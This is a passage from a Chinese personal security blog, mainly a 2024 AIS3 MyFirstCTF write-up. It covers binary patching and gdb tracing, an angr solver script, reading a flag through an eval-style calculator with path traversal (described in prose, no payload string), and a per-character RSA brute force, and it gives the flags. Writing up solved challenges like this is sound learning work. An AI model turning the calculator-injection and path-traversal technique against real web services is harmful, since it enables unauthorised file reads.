#\r這次能打到前五真的覺得很不可思議，感覺今年題目有比較難\n雖然我也沒有打過之前的比賽就對了\n這次能打到第五名首先要特別感謝努力的自己 ，還有要特別感謝成大資安社還有B33F 50μP戰隊，提供了許多學習資源讓我學習 ，不過這次能打到那麼高真的覺得自己只是單純運氣好，比賽的時候想到比較多奇怪的方法，很多題還都是被我硬搓出來的\n而且賽後發現很多本來名次在我後面的，在pre-exam的名次都超過我了🛐\n建議想看比較正規解的人可以去看看別人的write up，我的真的都比較偏通靈向\n廢話夠多了，再來就進入到WriteUp的部分了\nScoreboard #\r先丟上自己的記分板還有賽後超長的記分板 我是MFCTF完整記分板\n我是pre-exam完整記分板\nMisc #\rWelcome #\r這次的Welcome沒有整活，單純點開題目描述就有了 flag:AIS3{Welc0me_to_AIS3_PreExam_2o24!}\n好歹也把pre-exam改成MFCTF吧 Quantum Nim Heist #\r這題是賽後在pre-exam才解出來的\r這題當初在MFCTF的時候是想說可能要先去破解他hash加密的部分\n然後自己找出把1加密後的結果再拿去讀檔\n所以MFCTF的時候想很久也沒有想出來該怎麼做\n結果賽後在pre-exam的時候無聊去亂試意外就找到破解的地方了\nsolve:\r如果一開始遊玩時亂輸入的話會顯示錯誤，因此就先正常進行遊戲動個幾步，後面直接按enter就會發現沒有報錯，而且對手也會動下一步\n因此再來就是等對手動到剩下最後一排的時候再去收割就好了 flag:AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?} Reverse #\rThe Long Print #\r先透過IDA查看反編譯後的代碼，主要可以發現在輸出的部分會重複執行sleep，因此無法直接透過執行來查看flag ，並且可以看到flag應該是存在v4也就是rsp的部分\n這邊再特別解釋一下，因為從上面反編譯後可以看到輸出後會再做V4\u0026gt;\u0026gt;=8的動作 因此這邊就是每次察看rsp的末兩位就好了 我一開始是透過gdb來在sleep的地方下斷點，然後直接jump到下一行，結果發現最後拚出來的flag怪怪的 其實這邊這個方法也可以 只是我當時看錯東西\n所以又去嘗試透過IDA先找到sleep的地方換成16進制檔案時在哪，再透過010Editor把那部分改成90，也就是不進行任何動作(這部分等等的火拳也會用到，會再詳細介紹)\nsolve:\r兩個方法其實後面要做的事情都差不多，都一樣是丟到gdb裡面，然後再printf的地方下斷點，並查看當時rsp的質，最後再轉成ASCII字元就好了 所以再來就一樣慢慢把flag搓出來 $rsp 的質: 0x3353494100000000 0x756f597b00000000 0x6572615f00000000 0x6568745f00000000 0x73616d5f00000000 0x5f72657400000000 0x745f666f00000000 0x5f656d6900000000 0x616e616d00000000 0x656d656700000000 0x2121746e00000000 0x7d3f212100000000 flag: AIS3{You_are_the_master_of_time_management!!!!?}\n火拳のエース #\r特別感謝Kazma在讀書會上分享angr這個工具 這題是透過angr來快速解出來的 Kazma的angr教學\n也沒有到秒解 還是想了很久\nsolve:\r一樣都先透過IDA查看反編譯後的代碼，發現跟之前自己練習angr官方Lab006使用到的觀念都差不多 主要都是把數據存在動態內存再去做混淆\r題目: lab006: 所以這邊直接偷Lab006的解來稍作修改\nimport angr import claripy import sys def main(argv): path_to_binary = argv[1] project = angr.Project(path_to_binary) start_address = 0x08049661 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password0 = claripy.BVS(\u0026#39;password0\u0026#39;, 64) password1 = claripy.BVS(\u0026#39;password1\u0026#39;, 64) password2 = claripy.BVS(\u0026#39;password2\u0026#39;, 64) password3 = claripy.BVS(\u0026#39;password3\u0026#39;, 64) fake_heap_address0 = 0xffffc93c pointer_to_malloc_memory_address0 = 0x090FB2D4 initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness) fake_heap_address1 = 0xffffc94c pointer_to_malloc_memory_address1 = 0x090FB2D8 initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness) fake_heap_address2 = 0xffffc95c pointer_to_malloc_memory_address2 = 0x090FB2DC initial_state.memory.store(pointer_to_malloc_memory_address2, fake_heap_address2, endness=project.arch.memory_endness) fake_heap_address3 = 0xffffc96c pointer_to_malloc_memory_address3 = 0x090FB2E0 initial_state.memory.store(pointer_to_malloc_memory_address3, fake_heap_address3, endness=project.arch.memory_endness) initial_state.memory.store(fake_heap_address0, password0) initial_state.memory.store(fake_heap_address1, password1) initial_state.memory.store(fake_heap_address2, password2) initial_state.memory.store(fake_heap_address3, password3) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\u0026#39;Yes! I remember now, this is it!\u0026#39; in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\u0026#39;It feels slightly wrong, but almost correct...\u0026#39; in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode() solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode() print (solution0,solution1,solution2,solution3) else: raise Exception(\u0026#39;Could not find the solution\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main(sys.argv) 這邊不特別解釋angr的代碼在做什麼\n接著透過剛剛LongPrint提到的，透過16進制編輯器先把print_flag的部分刪掉，因為這邊我們直接透過strings就可以看到前半部分了 具體刪除的方法是先透過IDA在欲刪除的部分下斷點，然後開啟debug模式，接著到設定將Number of opcode bytes設成6，接著切回去就可以看到該段位於十六進制檔案中的何處了 接著就拿腳本去跑一次修改過後的檔案，發現居然錯了 後面想說那不如乾脆把與lab不同的地方(進行xor的部分)也乾脆先刪掉好了，因此重複上述操作，再去跑一次腳本，發現這次就有順利出現結果了！ 那接著就是把得到的質丟回去還有xor的檔案，接著透過gdb在進行xor後下斷點，查看xor後的質是多少 那最後flag也是順利被我搓出來了 這題大概是我這次最正規的解法了 flag:AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!} Web #\rEvil Calculator #\rsolve:\r連進去發現是一個計算機，就很普通的計算機\r接著透過burp suite攔截發送1+1過去時的封包並送到Repeater查看 接著就嘗試修改1+1的部分，我先是嘗試看看能不能單純輸出字元，或是符號之類的 發現好像不能直接輸出，那接著猜測是不是只能數字，因此這邊使用簡單的len來查看，發現可以正常輸出，因此推測只要是轉成數字輸出後就可以 接著就根據題目給的檔案，知道了flag是在前一個目錄裡面，因此就嘗試結合len、read、跟Path Traversal去讀看看，發現也可以正常執行，並且知道了flag的長度為31 再來我的想法是，一個一個讀取flag的字元，因此一樣使用read只是將len改成ord來查看該字元換成ASCII為多少，但發現會報錯\n這邊直接把報錯貼到google去看，了解原來是因為直接read後就已經是數字了，不需要再透過ord去轉 因此最後直接就把ord去掉，再次察看就會發現有正常輸出了！\n然後就重複這個操作31次 flag就被我搓出來了呢 flag:AIS3{7RiANG13_5NAK3_I5_50_3Vi1}\nCrypto #\rbabyRSA #\r這題也是被我硬搓出來的 我對不起大家\nsolve:\r這邊先查看原代碼，可以發現它應該是對flag的每個字元去做個別加密的，因此最後輸出結果才會有那麼多\r這邊我想了很久，最後決定！\n對string.printable全部做一次加密 然後慢慢把flag對照搓出來 我的方法真的很笨 自己都看不下去的那種\nimport string def encrypt(pk, plaintext): key, n = pk cipher = [pow(ord(char), key, n) for char in plaintext] return cipher public=(64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649) flag=string.printable print(flag) encrypted_msg = encrypt(public, flag) for i in range(len(flag)): print(flag[i],\u0026#34;=\u0026#34;,encrypted_msg[i]) 我是直接在記事本裡面慢慢用搜尋跟取代把flag搓出來啦，因為那個時候比賽快結束了，也懶得去想程式碼要怎麼寫，所以這邊就直接藉助了工人智慧 而且flag檔案的第一碼還不是A 害我當初困惑超久 所以後面才決定直接把全部都硬搓出來\nflag:AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}\n好欸終於寫完了\n然後如果發現我上述有錯誤的地方 都歡迎私訊我提醒我改一下\n相關問題 #\r這邊會比較偏我當初行前自己有疑惑的點，算是半個指引吧\r首先是交通的問題，這次舉辦的地點在救國團劍潭青年活動中心-集賢廳 (台北市中山北路四段16號)\n我自己是騎車過去啦，當初一直在想到底有沒有車位，後來其實發現在正門入口就有免費停車場了，而且還滿空的，因此大家可以放心騎車去了 再來是題目數量的部分，這次題目好像有比較多，以往好像都是各類型抓兩題，但這次是變成三題，不確定以後會不會也都是三題\n題目總覽 ","date":"30 June 2024","externalUrl":null,"permalink":"/posts/001_mfctf_writeup/","section":"Posts","summary":"2024ㄉMyFirstCTF跟pre-examㄉWriteUp","title":"2024 MyFirstCTF WriteUp","type":"posts"},{"content":"\r建立契機 #\r發現各大佬都有自己的網站，我也想要有一個\n當初打CTF在看別人寫的Write up就想著以後也要自己寫在部落格裡\n剛好想說可以創個地方來讓我寫各種資安相關的經歷\n因此這個網站主要內容也比較都會是以我的各種資安相關經歷為主\n網站簡介 #\r這個網站是透過\rHugo 建立，並套用了\rblowfish 主題\n然後我其實很不會寫網站 歡迎各位大神指導我\n網站歷史 #\r2024-5-27 網站創立\n","date":"31 May 2024","externalUrl":null,"permalink":"/intro/","section":"betan423.github.io","summary":"看看我ㄉ部落格歷史。","title":"網站簡介","type":"page"},{"content":"\r副標題\r段落標題 #\r換行 圖片 ","date":"23 April 2005","externalUrl":null,"permalink":"/%E9%A0%90%E8%A8%AD/","section":"betan423.github.io","summary":"複製用模板","title":"模板","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"\r看看我給未來的自己畫了多少餅\r資安相關規劃 #\r學習malware 正在啃《Windows APT Warfare：惡意程式前線戰術指南》 學好reverse跟pwn 每周CTF，小目標是最少要把warm up跟easy的題目都破台 ","date":"1 January 0001","externalUrl":null,"permalink":"/future/","section":"betan423.github.io","summary":"我ㄉ未來規劃。","title":"未來規劃","type":"page"},{"content":"\n這我 #\r嗨我是貝坦，一個誤打誤撞跑去學資安的怪人\n當初對於資安這塊完全沒概念，但大學不小心上了一個名子很長的資安系， 在經過一學期的各種講座洗禮以及自己稍微了解後，發現對於資安好像滿有興趣的， 結果就栽進這個無底洞了。\n資安經驗 #\r2024-4 加入B33F 50μP戰隊\n2024-8 參與2024 AIS3\n2024-8 臺灣好厲駭第九屆\n競賽經驗 #\r2024 My First CTF 銀質獎/第5名\n2024 AIS3 最佳專題獎\n","date":"1 January 0001","externalUrl":null,"permalink":"/authors/betan/","section":"Authors","summary":"","title":"我是貝坦betan","type":"authors"}]